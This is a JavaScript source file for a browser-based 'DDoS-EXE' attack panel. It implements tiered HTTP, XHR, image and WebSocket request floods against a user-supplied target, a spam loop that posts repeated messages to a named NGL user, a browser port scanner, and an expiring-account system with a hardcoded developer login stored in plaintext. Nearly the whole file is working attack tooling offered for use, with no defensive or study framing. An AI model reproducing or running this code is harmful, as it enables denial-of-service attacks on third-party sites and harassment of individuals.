/**
 * DDoS-EXE PROTOCOL CORE ENGINE - REAL IMPLEMENTATION
 * Version: 3.0
 * Mode: REAL (No simulations)
 * Permission System: Guest, Special, Developer
 */

const DDOSEngine = (function() {
    // Configuration
    const CONFIG = {
        VERSION: '3.0-REAL',
        STORAGE_KEY: 'ddos_exe_system_v3',
        NGL_API: 'https://ngl.link/api/submit',
        
        // Attack Types Configuration
        ATTACK_TYPES: {
            '500': { name: 'Normal', threads: 5, methods: ['http'] },
            '1000': { name: 'Medium', threads: 10, methods: ['http', 'ws'] },
            '5000': { name: 'Hard', threads: 20, methods: ['http', 'ws', 'xhr'] },
            '100000': { name: 'Extreme', threads: 50, methods: ['http', 'ws', 'xhr', 'img'] },
            '500000': { name: 'Dev', threads: 100, methods: ['all'] }
        },
        
        // Permission System
        PERMISSION_MAP: {
            'guest': {
                attacks: ['500', '1000', '5000'], // Normal, Medium, Hard only
                features: ['ddos', 'ngl', 'scanner', 'profile'], // No dev panel
                maxDuration: 300, // 5 minutes max
                description: 'Basic access - 500-5000 RPS attacks'
            },
            'special': {
                attacks: ['500', '1000', '5000', '100000'], // All except Dev RPS
                features: ['ddos', 'ngl', 'scanner', 'profile'], // No dev panel
                maxDuration: 600, // 10 minutes max
                description: 'Extended access - 500-100k RPS attacks'
            },
            'developer': {
                attacks: ['500', '1000', '5000', '100000', '500000'], // All attacks
                features: ['ddos', 'ngl', 'scanner', 'dev', 'profile'], // All features
                maxDuration: 3600, // 1 hour max
                description: 'Full access - All attacks + Dev panel'
            }
        },
        
        DEFAULT_ACCOUNTS: [
            {
                username: 'DinoD',
                password: 'DinoProtocol',
                type: 'developer',
                created: Date.now(),
                expires: Number.MAX_SAFE_INTEGER,
                permissions: ['*']
            }
        ]
    };
    
    // State
    let state = {
        users: [],
        attacks: [],
        logs: [],
        activeAttack: null,
        activeSpam: null,
        activeScan: null
    };
    
    // Initialize
    function init() {
        console.log('Initializing DDoS-EXE REAL Engine v' + CONFIG.VERSION);
        
        // Load state from localStorage
        const saved = localStorage.getItem(CONFIG.STORAGE_KEY);
        if (saved) {
            try {
                state = JSON.parse(saved);
                console.log('Loaded state:', state);
            } catch (e) {
                console.error('Failed to load state, resetting:', e);
                resetState();
            }
        } else {
            resetState();
        }
        
        // Ensure DinoD account exists
        ensureDefaultAccount();
        
        // Save initial state
        saveState();
        
        logToGlobal('[SYSTEM] Engine initialized - REAL MODE');
        logToGlobal('[PERMISSIONS] Permission system active: Guest, Special, Developer');
        return true;
    }
    
    function resetState() {
        state = {
            users: [...CONFIG.DEFAULT_ACCOUNTS],
            attacks: [],
            logs: [],
            activeAttack: null,
            activeSpam: null,
            activeScan: null
        };
    }
    
    function ensureDefaultAccount() {
        const dinoAccount = state.users.find(u => u.username === 'DinoD');
        if (!dinoAccount) {
            state.users.push(CONFIG.DEFAULT_ACCOUNTS[0]);
            logToGlobal('[SYSTEM] Default account DinoD created');
        } else {
            // Ensure correct password and permissions
            dinoAccount.password = 'DinoProtocol';
            dinoAccount.type = 'developer';
            dinoAccount.expires = Number.MAX_SAFE_INTEGER;
        }
    }
    
    function saveState() {
        try {
            localStorage.setItem(CONFIG.STORAGE_KEY, JSON.stringify(state));
            return true;
        } catch (e) {
            console.error('Failed to save state:', e);
            return false;
        }
    }
    
    // ==================== PERMISSION FUNCTIONS ====================
    
    function getUserPermissions(userType) {
        return CONFIG.PERMISSION_MAP[userType] || CONFIG.PERMISSION_MAP.guest;
    }
    
    function checkAttackPermission(userType, attackType) {
        const permissions = getUserPermissions(userType);
        return permissions.attacks.includes(attackType);
    }
    
    function checkFeaturePermission(userType, feature) {
        const permissions = getUserPermissions(userType);
        return permissions.features.includes(feature);
    }
    
    function getMaxDuration(userType) {
        const permissions = getUserPermissions(userType);
        return permissions.maxDuration;
    }
    
    // ==================== AUTHENTICATION ====================
    
    function authenticate(username, password) {
        console.log('Authentication attempt:', username);
        
        const user = state.users.find(u => 
            u.username === username && u.password === password
        );
        
        if (user) {
            // Check expiration
            if (user.expires !== Number.MAX_SAFE_INTEGER && Date.now() > user.expires) {
                logToGlobal(`[AUTH] Account ${username} has expired`);
                return false;
            }
            
            // Set session
            sessionStorage.setItem('ddos_user', username);
            sessionStorage.setItem('ddos_user_type', user.type);
            
            // Log permissions
            const permissions = getUserPermissions(user.type);
            logToGlobal(`[AUTH] Login successful: ${username} (${user.type})`);
            logToGlobal(`[PERMISSIONS] Access level: ${permissions.description}`);
            
            return true;
        }
        
        logToGlobal(`[AUTH] Failed login attempt: ${username}`);
        return false;
    }
    
    function getCurrentUser() {
        const username = sessionStorage.getItem('ddos_user');
        if (!username) return null;
        
        const user = state.users.find(u => u.username === username);
        if (!user) {
            // Clear invalid session
            sessionStorage.removeItem('ddos_user');
            sessionStorage.removeItem('ddos_user_type');
            return null;
        }
        
        return user;
    }
    
    function getRemainingTime(username) {
        const user = state.users.find(u => u.username === username);
        if (!user) return 'N/A';
        
        if (user.expires === Number.MAX_SAFE_INTEGER) {
            return '∞ NEVER';
        }
        
        const remaining = user.expires - Date.now();
        if (remaining <= 0) return 'EXPIRED';
        
        const days = Math.floor(remaining / (1000 * 60 * 60 * 24));
        const hours = Math.floor((remaining % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
        
        if (days > 0) return `${days}d ${hours}h`;
        if (hours > 0) return `${hours}h`;
        
        const minutes = Math.floor((remaining % (1000 * 60 * 60)) / (1000 * 60));
        return `${minutes}m`;
    }
    
    // ==================== DDoS ATTACK FUNCTIONS ====================
    
    function startDDoSAttack(target, port, type, duration) {
        const user = getCurrentUser();
        if (!user) {
            logToGlobal('[ERROR] Not authenticated');
            return false;
        }
        
        // Check if attack type is allowed for this user
        if (!checkAttackPermission(user.type, type)) {
            logToGlobal(`[ERROR] ${user.type.toUpperCase()} account cannot use ${type} RPS attack`);
            alert(`ACCESS DENIED: ${user.type.toUpperCase()} accounts cannot use this attack type`);
            return false;
        }
        
        // Check duration limit
        const maxDuration = getMaxDuration(user.type);
        if (duration > maxDuration) {
            logToGlobal(`[ERROR] Duration ${duration}s exceeds limit of ${maxDuration}s for ${user.type}`);
            alert(`Duration limit exceeded: ${user.type.toUpperCase()} accounts max ${maxDuration} seconds`);
            return false;
        }
        
        // Clean target
        target = target.replace(/https?:\/\//, '').replace(/\/$/, '');
        const attackType = CONFIG.ATTACK_TYPES[type] || CONFIG.ATTACK_TYPES['500'];
        
        logToGlobal(`[ATTACK] Launching ${attackType.name} attack on ${target}:${port}`);
        logToGlobal(`[ATTACK] Duration: ${duration}s | Threads: ${attackType.threads} | Account: ${user.type}`);
        
        // Create attack record
        const attackId = 'attack_' + Date.now();
        state.attacks.push({
            id: attackId,
            username: user.username,
            userType: user.type,
            target: target,
            port: port,
            type: attackType.name,
            rps: type,
            startTime: Date.now(),
            duration: duration * 1000,
            status: 'running'
        });
        
        saveState();
        
        // Start REAL attack
        state.activeAttack = {
            id: attackId,
            running: true,
            threads: []
        };
        
        // Start attack threads
        for (let i = 0; i < attackType.threads; i++) {
            startAttackThread(target, port, type, duration, i, attackType.methods);
        }
        
        // Monitor attack
        const monitor = setInterval(() => {
            if (!state.activeAttack || !state.activeAttack.running) {
                clearInterval(monitor);
                return;
            }
            
            const attack = state.attacks.find(a => a.id === attackId);
            if (attack && Date.now() > attack.startTime + attack.duration) {
                stopDDoSAttack();
                clearInterval(monitor);
            }
        }, 1000);
        
        return attackId;
    }
    
    function startAttackThread(target, port, rps, duration, threadId, methods) {
        const requestsPerSecond = Math.max(1, Math.floor(rps / 100));
        let requestCount = 0;
        
        function sendRealRequest() {
            if (!state.activeAttack || !state.activeAttack.running) return;
            
            const baseUrl = port == 443 ? `https://${target}` : `http://${target}:${port}`;
            
            // Send multiple types of requests
            methods.forEach(method => {
                try {
                    switch(method) {
                        case 'http':
                            // HTTP request via fetch
                            fetch(baseUrl + '/?' + Date.now() + threadId + requestCount, {
                                method: 'GET',
                                mode: 'no-cors',
                                cache: 'no-store',
                                headers: {
                                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                                    'Accept': '*/*',
                                    'Accept-Language': 'en-US,en;q=0.9',
                                    'Accept-Encoding': 'gzip, deflate',
                                    'Connection': 'keep-alive',
                                    'Cache-Control': 'no-cache',
                                    'Pragma': 'no-cache'
                                }
                            }).catch(() => {});
                            break;
                            
                        case 'xhr':
                            // XMLHttpRequest
                            const xhr = new XMLHttpRequest();
                            xhr.open('GET', baseUrl + '/?' + Date.now(), true);
                            xhr.timeout = 5000;
                            xhr.send();
                            break;
                            
                        case 'img':
                            // Image ping
                            const img = new Image();
                            img.src = baseUrl + '/favicon.ico?' + Date.now();
                            break;
                            
                        case 'ws':
                            // WebSocket connection attempt
                            if (port === 80 || port === 443 || port === 8080) {
                                const wsUrl = port === 443 ? `wss://${target}` : `ws://${target}:${port}`;
                                const ws = new WebSocket(wsUrl);
                                ws.onopen = () => ws.close();
                                setTimeout(() => {
                                    if (ws.readyState === WebSocket.OPEN) ws.close();
                                }, 100);
                            }
                            break;
                    }
                    
                    requestCount++;
                    
                    // Update terminal
                    if (requestCount % 10 === 0) {
                        const terminal = document.getElementById('ddosTerminal');
                        if (terminal) {
                            const lines = terminal.querySelectorAll('.terminal-line');
                            if (lines.length > 0) {
                                const lastLine = lines[lines.length - 1];
                                if (lastLine.textContent.includes('[ATTACK]')) {
                                    lastLine.textContent = `[ATTACK] Thread ${threadId}: ${requestCount} requests sent`;
                                }
                            }
                        }
                    }
                    
                } catch (e) {
                    // Silent fail
                }
            });
            
            // Continue if still running
            if (state.activeAttack && state.activeAttack.running) {
                const delay = Math.floor(1000 / requestsPerSecond);
                setTimeout(sendRealRequest, Math.max(10, delay));
            }
        }
        
        // Start sending requests
        for (let i = 0; i < requestsPerSecond; i++) {
            setTimeout(() => {
                if (state.activeAttack && state.activeAttack.running) {
                    sendRealRequest();
                }
            }, i * (1000 / requestsPerSecond));
        }
        
        // Store thread reference
        if (state.activeAttack) {
            state.activeAttack.threads.push({
                id: threadId,
                interval: setInterval(sendRealRequest, 1000 / requestsPerSecond)
            });
        }
    }
    
    function stopDDoSAttack() {
        if (state.activeAttack) {
            // Clear all intervals
            state.activeAttack.threads.forEach(thread => {
                if (thread.interval) clearInterval(thread.interval);
            });
            
            state.activeAttack.running = false;
            state.activeAttack = null;
            
            logToGlobal('[ATTACK] Stopped - all threads terminated');
            
            // Update attack record
            const latestAttack = state.attacks[state.attacks.length - 1];
            if (latestAttack) {
                latestAttack.status = 'stopped';
                latestAttack.endTime = Date.now();
                saveState();
            }
        }
        return true;
    }
    
    // ==================== NGL SPAM FUNCTIONS ====================
    
    async function startNGLSpam(username, message, count, delay, sender) {
        const user = getCurrentUser();
        if (!user) {
            logToGlobal('[ERROR] Not authenticated');
            return false;
        }
        
        logToGlobal(`[NGL] Starting REAL spam to ${username} (Account: ${user.type})`);
        
        state.activeSpam = {
            running: true,
            sent: 0,
            failed: 0
        };
        
        const nglUrl = CONFIG.NGL_API;
        
        for (let i = 0; i < count && state.activeSpam.running; i++) {
            try {
                // Create form data
                const formData = new FormData();
                formData.append('username', username);
                formData.append('question', message);
                if (sender && sender.trim()) {
                    formData.append('deviceId', sender.trim());
                }
                
                // Send REAL request
                const response = await fetch(nglUrl, {
                    method: 'POST',
                    mode: 'cors',
                    headers: {
                        'Accept': 'application/json',
                    },
                    body: formData
                });
                
                if (response.ok) {
                    state.activeSpam.sent++;
                    logToGlobal(`[NGL] ${state.activeSpam.sent}/${count} sent to ${username}`);
                } else {
                    state.activeSpam.failed++;
                }
                
                // Update terminal
                updateNGLTerminal();
                
            } catch (error) {
                state.activeSpam.failed++;
                logToGlobal(`[NGL] Error: ${error.message}`);
            }
            
            // Delay between requests
            if (i < count - 1 && state.activeSpam.running) {
                await new Promise(resolve => setTimeout(resolve, delay));
            }
        }
        
        const result = `[NGL] Completed: ${state.activeSpam.sent} sent, ${state.activeSpam.failed} failed`;
        logToGlobal(result);
        state.activeSpam = null;
        
        return state.activeSpam ? false : true;
    }
    
    function updateNGLTerminal() {
        if (!state.activeSpam) return;
        
        const terminal = document.getElementById('nglTerminal');
        if (terminal) {
            const lines = terminal.querySelectorAll('.terminal-line');
            if (lines.length > 2) {
                const progressLine = lines[lines.length - 1];
                progressLine.textContent = 
                    `[NGL] Progress: ${state.activeSpam.sent} sent | ${state.activeSpam.failed} failed`;
            }
        }
    }
    
    // ==================== IP SCANNER FUNCTIONS ====================
    
    async function startIPScan(target, ports, timeout) {
        const user = getCurrentUser();
        if (!user) {
            logToGlobal('[ERROR] Not authenticated');
            return false;
        }
        
        logToGlobal(`[SCAN] Starting REAL port scan: ${target} (Account: ${user.type})`);
        
        state.activeScan = {
            running: true,
            results: []
        };
        
        const portList = ports.split(',')
            .map(p => parseInt(p.trim()))
            .filter(p => !isNaN(p) && p > 0 && p <= 65535);
        
        const resultsDiv = document.getElementById('scanResults');
        if (resultsDiv) {
            resultsDiv.innerHTML = '';
        }
        
        for (const port of portList) {
            if (!state.activeScan || !state.activeScan.running) break;
            
            const result = await scanPort(target, port, timeout);
            state.activeScan.results.push(result);
            
            // Display result
            displayScanResult(result);
            
            // Small delay between scans
            await new Promise(resolve => setTimeout(resolve, 50));
        }
        
        const openPorts = state.activeScan.results.filter(r => r.status === 'OPEN').length;
        logToGlobal(`[SCAN] Completed: ${openPorts} ports open out of ${portList.length}`);
        state.activeScan = null;
        
        return true;
    }
    
    async function scanPort(host, port, timeout) {
        const startTime = Date.now();
        const controller = new AbortController();
        const timeoutId = setTimeout(() => controller.abort(), timeout);
        
        try {
            // Try HTTP/HTTPS
            const protocol = port === 443 ? 'https' : 'http';
            const url = `${protocol}://${host}:${port}`;
            
            const response = await fetch(url, {
                method: 'HEAD',
                mode: 'no-cors',
                signal: controller.signal,
                cache: 'no-store'
            }).catch(() => null);
            
            clearTimeout(timeoutId);
            
            if (response !== null) {
                return {
                    port: port,
                    status: 'OPEN',
                    service: getServiceName(port),
                    responseTime: Date.now() - startTime,
                    method: 'HTTP'
                };
            }
        } catch (e) {
            clearTimeout(timeoutId);
        }
        
        // Try WebSocket
        try {
            const wsCheck = await new Promise((resolve) => {
                const wsProtocol = port === 443 ? 'wss' : 'ws';
                const wsUrl = `${wsProtocol}://${host}:${port}`;
                const ws = new WebSocket(wsUrl);
                let resolved = false;
                
                const wsTimeout = setTimeout(() => {
                    if (!resolved) {
                        ws.close();
                        resolve(false);
                    }
                }, timeout);
                
                ws.onopen = () => {
                    resolved = true;
                    clearTimeout(wsTimeout);
                    ws.close();
                    resolve(true);
                };
                
                ws.onerror = () => {
                    if (!resolved) {
                        resolved = true;
                        clearTimeout(wsTimeout);
                        resolve(false);
                    }
                };
            });
            
            if (wsCheck) {
                return {
                    port: port,
                    status: 'OPEN',
                    service: getServiceName(port),
                    responseTime: Date.now() - startTime,
                    method: 'WebSocket'
                };
            }
        } catch (e) {}
        
        return {
            port: port,
            status: 'CLOSED',
            service: 'Unknown',
            responseTime: Date.now() - startTime,
            method: 'Timeout'
        };
    }
    
    function getServiceName(port) {
        const services = {
            20: 'FTP-DATA', 21: 'FTP', 22: 'SSH', 23: 'Telnet', 25: 'SMTP',
            53: 'DNS', 80: 'HTTP', 110: 'POP3', 143: 'IMAP', 443: 'HTTPS',
            465: 'SMTPS', 587: 'SMTP', 993: 'IMAPS', 995: 'POP3S', 3306: 'MySQL',
            3389: 'RDP', 5432: 'PostgreSQL', 5900: 'VNC', 6379: 'Redis',
            8080: 'HTTP-Proxy', 8443: 'HTTPS-Alt', 27017: 'MongoDB', 11211: 'Memcached'
        };
        return services[port] || 'Unknown';
    }
    
    function displayScanResult(result) {
        const resultsDiv = document.getElementById('scanResults');
        if (!resultsDiv) return;
        
        const resultDiv = document.createElement('div');
        resultDiv.className = 'scan-result';
        
        const statusClass = result.status === 'OPEN' ? 'status-open' : 'status-closed';
        
        resultDiv.innerHTML = `
            <span>${result.port}</span>
            <span class="${statusClass}">${result.status}</span>
            <span>${result.service}</span>
            <span>${result.responseTime}ms</span>
        `;
        
        resultsDiv.appendChild(resultDiv);
    }
    
    // ==================== ACCOUNT MANAGEMENT ====================
    
    function createAccount(username, password, type, expireValue, expireUnit) {
        const user = getCurrentUser();
        if (!user || user.type !== 'developer') {
            logToGlobal('[ERROR] Developer access required');
            return false;
        }
        
        if (username.toLowerCase() === 'dinod') {
            logToGlobal('[ERROR] Username DinoD is reserved');
            return false;
        }
        
        if (state.users.find(u => u.username === username)) {
            logToGlobal(`[ERROR] Username ${username} already exists`);
            return false;
        }
        
        // Calculate expiration
        let expireMs;
        if (expireUnit === 'infinite') {
            expireMs = Number.MAX_SAFE_INTEGER;
        } else {
            const value = parseFloat(expireValue);
            if (isNaN(value) || value <= 0) {
                logToGlobal('[ERROR] Invalid expiration value');
                return false;
            }
            
            const multipliers = {
                minute: 60 * 1000,
                hour: 60 * 60 * 1000,
                day: 24 * 60 * 60 * 1000,
                month: 30 * 24 * 60 * 60 * 1000,
                year: 365 * 24 * 60 * 60 * 1000
            };
            
            expireMs = value * (multipliers[expireUnit] || multipliers.minute);
        }
        
        const newUser = {
            username: username,
            password: password,
            type: type,
            created: Date.now(),
            expires: Date.now() + expireMs,
            permissions: CONFIG.PERMISSION_MAP[type] ? CONFIG.PERMISSION_MAP[type].features : []
        };
        
        state.users.push(newUser);
        saveState();
        
        const expireText = expireUnit === 'infinite' ? '∞ NEVER' : `${expireValue} ${expireUnit}`;
        logToGlobal(`[DEV] Created ${type} account: ${username} (expires: ${expireText})`);
        
        return true;
    }
    
    function loadAccountList() {
        const accountListDiv = document.getElementById('accountList');
        if (!accountListDiv) return;
        
        accountListDiv.innerHTML = '';
        
        // Create developer panel content
        const devPanel = document.getElementById('devPanelContent');
        if (devPanel) {
            devPanel.innerHTML = `
                <div class="dev-subsection">
                    <h3><i class="fas fa-user-plus"></i> CREATE ACCOUNT</h3>
                    <div class="control-group">
                        <label>USERNAME</label>
                        <input type="text" id="newUsername" placeholder="new_user" required>
                    </div>
                    <div class="control-group">
                        <label>PASSWORD</label>
                        <div class="password-generator">
                            <input type="text" id="newPassword" placeholder="Click generate" readonly>
                            <button type="button" class="hacker-btn small" id="generatePass">
                                <i class="fas fa-key"></i> GENERATE
                            </button>
                        </div>
                    </div>
                    <div class="control-group">
                        <label>ACCOUNT TYPE</label>
                        <select id="accountType">
                            <option value="guest">Guest (Normal, Medium, Hard attacks)</option>
                            <option value="special">Special (+ Extreme attacks)</option>
                            <option value="developer">Developer (Full Access)</option>
                        </select>
                    </div>
                    <div class="control-group">
                        <label>EXPIRATION TIME</label>
                        <div class="expiration-controls">
                            <input type="number" id="expireValue" value="30" min="1" placeholder="Number">
                            <select id="expireUnit">
                                <option value="minute">Minutes</option>
                                <option value="hour">Hours</option>
                                <option value="day">Days</option>
                                <option value="month">Months (30 days)</option>
                                <option value="year">Years (365 days)</option>
                                <option value="infinite">∞ Never Expires</option>
                            </select>
                        </div>
                    </div>
                    <button class="hacker-btn" id="createAccount">
                        <i class="fas fa-plus"></i> CREATE ACCOUNT
                    </button>
                </div>

                <div class="dev-subsection">
                    <h3><i class="fas fa-list"></i> ACCOUNT LIST</h3>
                    <div class="account-list">
                        ${state.users.map(user => {
                            const remaining = getRemainingTime(user.username);
                            const expired = user.expires !== Number.MAX_SAFE_INTEGER && Date.now() > user.expires;
                            const isInfinite = user.expires === Number.MAX_SAFE_INTEGER;
                            
                            return `
                                <div class="account-item">
                                    <div class="account-info">
                                        <strong>${user.username}</strong>
                                        <span class="account-type ${user.type} ${isInfinite ? 'infinite' : ''}">${user.type.toUpperCase()}</span>
                                        <span class="account-expiry ${expired ? 'expired' : ''} ${isInfinite ? 'infinite' : ''}">
                                            ${isInfinite ? '∞ NEVER' : expired ? 'EXPIRED' : remaining}
                                        </span>
                                    </div>
                                    <div class="account-actions">
                                        <button class="action-btn copy-btn" data-username="${user.username}" data-password="${user.password}">
                                            <i class="fas fa-copy"></i> COPY
                                        </button>
                                        ${user.username !== 'DinoD' ? 
                                            `<button class="action-btn delete-btn" data-username="${user.username}">
                                                <i class="fas fa-trash"></i> DELETE
                                            </button>` : ''
                                        }
                                    </div>
                                </div>
                            `;
                        }).join('')}
                    </div>
                </div>
            `;
            
            // Add event listeners
            setTimeout(() => {
                document.getElementById('generatePass')?.addEventListener('click', function() {
                    document.getElementById('newPassword').value = generatePassword();
                });
                
                document.getElementById('createAccount')?.addEventListener('click', function() {
                    const username = document.getElementById('newUsername').value.trim();
                    const password = document.getElementById('newPassword').value;
                    const type = document.getElementById('accountType').value;
                    const expireValue = document.getElementById('expireValue').value;
                    const expireUnit = document.getElementById('expireUnit').value;
                    
                    if (!username) {
                        alert('Username is required');
                        return;
                    }
                    
                    if (!password) {
                        alert('Password is required (click GENERATE)');
                        return;
                    }
                    
                    if (username.toLowerCase() === 'dinod') {
                        alert('Username "DinoD" is reserved for system owner');
                        return;
                    }
                    
                    if (createAccount(username, password, type, expireValue, expireUnit)) {
                        loadAccountList();
                        document.getElementById('newUsername').value = '';
                        document.getElementById('newPassword').value = '';
                        document.getElementById('expireValue').value = '30';
                        document.getElementById('expireUnit').value = 'minute';
                    }
                });
                
                document.querySelectorAll('.copy-btn').forEach(btn => {
                    btn.addEventListener('click', function() {
                        const username = this.getAttribute('data-username');
                        const password = this.getAttribute('data-password');
                        navigator.clipboard.writeText(`Username: ${username}\nPassword: ${password}`);
                        logToGlobal(`[DEV] Copied credentials for ${username}`);
                    });
                });
                
                document.querySelectorAll('.delete-btn').forEach(btn => {
                    btn.addEventListener('click', function() {
                        const username = this.getAttribute('data-username');
                        if (confirm(`Delete account ${username}?`)) {
                            state.users = state.users.filter(u => u.username !== username);
                            saveState();
                            loadAccountList();
                            logToGlobal(`[DEV] Deleted account: ${username}`);
                        }
                    });
                });
            }, 100);
        }
    }
    
    function changePassword(currentPass, newPass) {
        const user = getCurrentUser();
        if (!user) return false;
        
        if (user.password !== currentPass) {
            return false;
        }
        
        user.password = newPass;
        saveState();
        logToGlobal('[PROFILE] Password changed successfully');
        return true;
    }
    
    // ==================== UTILITY FUNCTIONS ====================
    
    function logToGlobal(message) {
        // Add to state logs
        state.logs.push({
            time: Date.now(),
            message: message
        });
        
        // Keep only last 100 logs
        if (state.logs.length > 100) {
            state.logs = state.logs.slice(-100);
        }
        
        // Display in UI
        const logDiv = document.getElementById('globalLog');
        if (logDiv) {
            const entry = document.createElement('div');
            entry.className = 'log-entry';
            entry.textContent = `[${new Date().toLocaleTimeString()}] ${message}`;
            logDiv.appendChild(entry);
            logDiv.scrollTop = logDiv.scrollHeight;
        }
        
        console.log(`[DDoS-EXE] ${message}`);
        return true;
    }
    
    function generatePassword(length = 12) {
        const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*';
        let password = '';
        for (let i = 0; i < length; i++) {
            password += chars.charAt(Math.floor(Math.random() * chars.length));
        }
        return password;
    }
    
    function getDevPanelContent() {
        return `
            <div class="dev-subsection">
                <h3><i class="fas fa-user-plus"></i> CREATE ACCOUNT</h3>
                <div class="control-group">
                    <label>USERNAME</label>
                    <input type="text" id="newUsername" placeholder="new_user" required>
                </div>
                <div class="control-group">
                    <label>PASSWORD</label>
                    <div class="password-generator">
                        <input type="text" id="newPassword" placeholder="Click generate" readonly>
                        <button type="button" class="hacker-btn small" id="generatePass">
                            <i class="fas fa-key"></i> GENERATE
                        </button>
                    </div>
                </div>
                <div class="control-group">
                    <label>ACCOUNT TYPE</label>
                    <select id="accountType">
                        <option value="guest">Guest (Normal, Medium, Hard attacks)</option>
                        <option value="special">Special (+ Extreme attacks)</option>
                        <option value="developer">Developer (Full Access)</option>
                    </select>
                </div>
                <div class="control-group">
                    <label>EXPIRATION TIME</label>
                    <div class="expiration-controls">
                        <input type="number" id="expireValue" value="30" min="1" placeholder="Number">
                        <select id="expireUnit">
                            <option value="minute">Minutes</option>
                            <option value="hour">Hours</option>
                            <option value="day">Days</option>
                            <option value="month">Months (30 days)</option>
                            <option value="year">Years (365 days)</option>
                            <option value="infinite">∞ Never Expires</option>
                        </select>
                    </div>
                </div>
                <button class="hacker-btn" id="createAccount">
                    <i class="fas fa-plus"></i> CREATE ACCOUNT
                </button>
            </div>

            <div class="dev-subsection">
                <h3><i class="fas fa-list"></i> ACCOUNT LIST</h3>
                <div class="account-list" id="dynamicAccountList">
                    <!-- Dynamic content will be loaded here -->
                </div>
            </div>
        `;
    }
    
    // Initialize on load
    init();
    
    // Public API
    return {
        // Core
        init,
        authenticate,
        getCurrentUser,
        getRemainingTime,
        logToGlobal,
        
        // Permissions
        getUserPermissions,
        checkAttackPermission,
        checkFeaturePermission,
        getMaxDuration,
        
        // DDoS Attack
        startDDoSAttack,
        stopDDoSAttack,
        
        // NGL Spam
        startNGLSpam,
        
        // IP Scanner
        startIPScan,
        getServiceName,
        
        // Account Management
        createAccount,
        loadAccountList,
        changePassword,
        generatePassword,
        
        // Developer Panel
        getDevPanelContent
    };
})();

// Auto-initialize
window.addEventListener('load', function() {
    DDOSEngine.init();
    
    // Auto-redirect if already logged in
    if (sessionStorage.getItem('ddos_user') && 
        window.location.pathname.includes('index.html')) {
        setTimeout(() => {
            window.location.href = 'system.html';
        }, 500);
    }
});